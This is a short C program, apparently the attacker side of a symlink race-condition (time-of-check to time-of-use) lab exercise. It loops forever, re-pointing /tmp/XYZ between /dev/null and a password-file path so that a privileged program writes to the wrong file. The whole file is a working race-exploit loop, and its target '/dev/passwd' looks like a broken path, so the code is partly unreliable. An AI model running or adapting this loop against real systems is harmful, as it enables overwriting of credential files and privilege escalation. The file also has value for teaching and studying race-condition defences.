#include <unistd.h>

int main(){
	while(1){
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		usleep(20000);

		unlink("/tmp/XYZ");
		symlink("/dev/passwd", "/tmp/XYZ");
		usleep(20000);
	}

	return 0;
}

